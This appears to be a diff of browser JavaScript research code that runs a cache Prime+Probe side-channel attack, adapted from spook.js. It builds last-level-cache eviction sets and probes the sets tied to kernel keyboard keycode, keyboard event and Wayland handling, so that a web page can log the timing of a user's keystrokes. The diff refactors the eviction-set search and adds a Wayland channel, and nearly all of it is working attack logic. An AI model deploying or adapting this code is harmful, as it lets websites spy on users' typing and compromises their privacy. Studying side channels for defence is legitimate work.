@@ -578,14 +578,54 @@ function check_find_all_slices(evset, num_slices){
     }
 }
 
-const KBD_KEYCODE_SET = 366;
-const KBD_EVENT_SET = 413;
 const LINE_SIZE = 64;
-const KBD_KEYCODE_VICTIM = KBD_KEYCODE_SET*LINE_SIZE;
-const KBD_EVENT_VICTIM = KBD_EVENT_SET*LINE_SIZE;
 const NUM_SETS_PER_SLICE = 2048;
 const NUM_SLICES = 4;
 const THRESHOLD = 60;
+
+async function find_evsets_all_slices(victim, module, memory, buffer, num_call){
+    let count = 0;
+    let found_sets = [];
+    let candidate_set = [];
+    let victims = [];
+    
+    for(let i = victim; i < 128 * 1024 * 1024; i += NUM_SETS_PER_SLICE * LINE_SIZE){
+        if(count < 32){
+            victims.push(i);
+            count++;
+            continue;
+        } 
+        candidate_set.push(i);
+    }
+
+    let num_sets = 0;
+    let victim_index = 0;
+    
+    /* out-of-bounds evset search algorithm */
+    while(num_sets < NUM_SLICES){
+        let victim = victims[victim_index]
+        let already_found = false;
+        for(let evset of found_sets){
+            if(evset.evict_reload(victim, 100)){
+                already_found = true;
+            } 
+        }  
+        if(!already_found){
+            let set = await build_evset({
+                offset: (victim - Math.floor(victim/4096) * 4096)/64,
+                module: module,
+                memory: memory,
+                victim: victim,
+                candidate_set: candidate_set
+            });
+            found_sets.push(new EvictionListL3(buffer, Array.from(set[num_call * NUM_SLICES])))
+            num_sets++;
+        }
+
+        victim_index++;
+    }
+    return found_sets;
+}
 
 // code adopted from create_spook_js in spook.js 
 async function l3pp_main(){ 
@@ -601,160 +641,82 @@ async function l3pp_main(){
     await startTimer();
 
     // Build eviction sets
-    
 
     self.importScripts('evsets/main.js');
     
-    // -----------------------------------------------------------------------------------------------
+    const KBD_KEYCODE_SET = 366;
+    const KEYCODE_SLICE = 3;
+    // const KBD_KEYCODE_SET = Math.floor(Math.random() * NUM_SETS_PER_SLICE);
+    // const KEYCODE_SLICE = Math.floor(Math.random() * NUM_SLICES);
+    const KBD_KEYCODE_VICTIM = KBD_KEYCODE_SET*LINE_SIZE;
+    log(`set: ${KBD_KEYCODE_SET}, slice: ${KEYCODE_SLICE}`)
 
-    let count = 0;
-    let keycode_found_sets = [];
-    let keycode_candidate_set = [];
-    let keycode_victims = [];
-    
-    for(let i = KBD_KEYCODE_VICTIM; i < 128 * 1024 * 1024; i += NUM_SETS_PER_SLICE * LINE_SIZE){
-        if(count < 32){
-            keycode_victims.push(i);
-            count++;
-            continue;
-        } 
-        keycode_candidate_set.push(i);
-    }
+    keycode_found_sets = await find_evsets_all_slices(KBD_KEYCODE_VICTIM, module, memory, buffer, 0);
+    log(keycode_found_sets);
 
-    let num_sets = 0;
-    let victim_index = 0;
-    
-    /* out-of-bounds evset search algorithm */
-    while(num_sets < NUM_SLICES){
-        let victim = keycode_victims[victim_index]
-        let already_found = false;
-        for(let evset of keycode_found_sets){
-            if(evset.evict_reload(victim, 100)){
-                already_found = true;
-            } 
-        }  
-        if(!already_found){
-            let set = await build_evset({
-                offset: (KBD_KEYCODE_VICTIM - Math.floor(KBD_KEYCODE_VICTIM/4096) * 4096)/64,
-                module: module,
-                memory: memory,
-                victim: KBD_KEYCODE_VICTIM,
-                candidate_set: keycode_candidate_set
-            });
-            keycode_found_sets.push(new EvictionListL3(buffer, Array.from(set[0])))
-            num_sets++;
-        }
+    const KBD_EVENT_SET = 413;
+    const EVENT_SLICE = 3;
+    // const KBD_EVENT_SET = Math.floor(Math.random() * NUM_SETS_PER_SLICE);
+    // const EVENT_SLICE = Math.floor(Math.random() * NUM_SLICES);
+    const KBD_EVENT_VICTIM = KBD_EVENT_SET*LINE_SIZE;
+    log(`set: ${KBD_EVENT_SET}, slice: ${EVENT_SLICE}`)
+    event_found_sets = await find_evsets_all_slices(KBD_EVENT_VICTIM, module, memory, buffer, 1);
+    log(event_found_sets);
 
-        victim_index++;
-    }
-    log("kbd_keycode")
-    log(keycode_found_sets)
+    // const WAYLAND_SET = Math.floor(Math.random() * NUM_SETS_PER_SLICE);;
+    // const WAYLAND_SLICE = Math.floor(Math.random() * NUM_SLICES);
+    const WAYLAND_SET = 1746;
+    const WAYLAND_SLICE = 3;
+    const WAYLAND_VICTIM = WAYLAND_SET * LINE_SIZE;
+    log(`set: ${WAYLAND_SET}, slice: ${WAYLAND_SLICE}`)
+    wayland_found_sets = await find_evsets_all_slices(WAYLAND_VICTIM, module, memory, buffer, 2);
+    log(wayland_found_sets);
 
-    // ----------------------------------------------------------------------------------------------------------
-    
-    count = 0;
-    let event_found_sets = [];
-    let event_candidate_set = [];
-    let event_victims = [];
-    
-    for(let i = KBD_EVENT_VICTIM; i < 128 * 1024 * 1024; i += NUM_SETS_PER_SLICE * LINE_SIZE){
-        if(count < 32){
-            event_victims.push(i);
-            count++;
-            continue;
-        } 
-        event_candidate_set.push(i);
-    }
-
-    num_sets = 0;
-    victim_index = 0;
-    
-    /* out-of-bounds evset search algorithm */
-    while(num_sets < NUM_SLICES){
-        let victim = event_victims[victim_index]
-        let already_found = false;
-        for(let evset of event_found_sets){
-            if(evset.evict_reload(victim, 100)){
-                already_found = true;
-            } 
-        }  
-        if(!already_found){
-            let set = await build_evset({
-                offset: (KBD_EVENT_VICTIM - Math.floor(KBD_EVENT_VICTIM/4096) * 4096)/64,
-                module: module,
-                memory: memory,
-                victim: KBD_EVENT_VICTIM,
-                candidate_set: event_candidate_set
-            });
-            event_found_sets.push(new EvictionListL3(buffer, Array.from(set[4])))
-            num_sets++;
-        }
-        victim_index++;
-    }
-    log("kbd_event")
-    log(event_found_sets)
-
-    //------------------------------------------------------------------------------------------------------
-
-    /* local transmission test */
-    let evset = keycode_found_sets[0];
-
-    const TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
-    ipdft_out = intra_process_detection_fp_test(evset, buffer, WARMUP_ROUNDS, TRIALS, KBD_KEYCODE_VICTIM);
-    log("detection-rate: " + ipdft_out[0]);
-    log("false-positive-rate: " + ipdft_out[1]);
-
-    /* compute detection rate */
-    const TRANSMIT_ROUNDS_SIDE = 256
-    intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, KBD_KEYCODE_VICTIM);
-
-    
-    await sleep(5000);
-    
     /* typing test begins */
     log("typing test begins now")
 
-    // log start measurement 
-    //
-    let start_measurement = Math.floor(performance.now());
-
-    log("start: "+start_measurement)
-
     const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
     const NUM_MEASUREMENTS_MS = 1024;
-    const KEYCODE_SLICE = 1
-    const EVENT_SLICE = 3
-    const RANDOM_SLICE = KEYCODE_SLICE % 3 + 1;
 
     let keycode_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
     let event_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
-    let random_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
+    let wayland_hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
     let keycode_traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
     let event_traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
-    let random_traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
+    let wayland_traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
 
     keycode_hit_count_per_ms.fill(0);
     keycode_traces.fill(0);
     event_hit_count_per_ms.fill(0);
     event_traces.fill(0);
-    random_hit_count_per_ms.fill(0);
-    random_traces.fill(0);
+    wayland_hit_count_per_ms.fill(0);
+    wayland_traces.fill(0);
 
     let num_traces = 0;
+
+    log(keycode_found_sets[KEYCODE_SLICE]["elements"])
+    log(event_found_sets[KEYCODE_SLICE]["elements"])
+    log(wayland_found_sets[KEYCODE_SLICE]["elements"])
+
+    await sleep(5000);
+    let start_measurement = Math.floor(performance.now());
+    log("start: "+start_measurement)
     
     /* warm up all sets for the test */
     for(let i = 0; i < 10; i++){
         keycode_found_sets[KEYCODE_SLICE].probe()
         event_found_sets[EVENT_SLICE].probe()
-        keycode_found_sets[0].probe() 
+        wayland_found_sets[WAYLAND_SLICE].probe() 
     } 
 
     while(num_traces < KEYSTROKE_BUFFER_SIZE){
         for(let i = 0; i < 8; i++){
-            let keycode_result = keycode_found_sets[3].probe();
-            let event_result = event_found_sets[3].probe(); 
+            let keycode_result = keycode_found_sets[KEYCODE_SLICE].probe();
+            let event_result = event_found_sets[EVENT_SLICE].probe(); 
+            let wayland_result = wayland_found_sets[WAYLAND_SLICE].probe(); 
             keycode_traces[num_traces] += (keycode_result << i); 
             event_traces[num_traces] += (event_result << i); 
+            wayland_traces[num_traces] += (wayland_result << i); 
         }
         num_traces++;
     }
@@ -768,18 +730,22 @@ async function l3pp_main(){
         for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
             let keycode_data = keycode_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
             let event_data = event_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            let wayland_data = wayland_traces[i * NUM_MEASUREMENTS_MS / 8 + j];
             for(let l = 0; l < 8; l++){
                 let keycode_result = keycode_data & 1;
                 let event_result = event_data & 1;
+                let wayland_result = wayland_data & 1;
                 keycode_hit_count_per_ms[i] += keycode_result;
                 event_hit_count_per_ms[i] += event_result;
+                wayland_hit_count_per_ms[i] += wayland_result;
                 keycode_data >>= 1;
                 event_data >>= 1;
+                wayland_data >>= 1;
             }
         }
     }
 
-    await graphKeystrokes({"keycode_data": keycode_hit_count_per_ms, "event_data": event_hit_count_per_ms, "random_data": random_hit_count_per_ms, "pp_duration": keycode_hit_count_per_ms.length, "js_duration": duration, "start_time": start_measurement});
+    await graphKeystrokes({"keycode_data": keycode_hit_count_per_ms, "event_data": event_hit_count_per_ms, "wayland_data": wayland_hit_count_per_ms, "pp_duration": keycode_hit_count_per_ms.length, "js_duration": duration, "start_time": start_measurement});
 
     // remote_set_profiling(evset);
     await stopTimer();
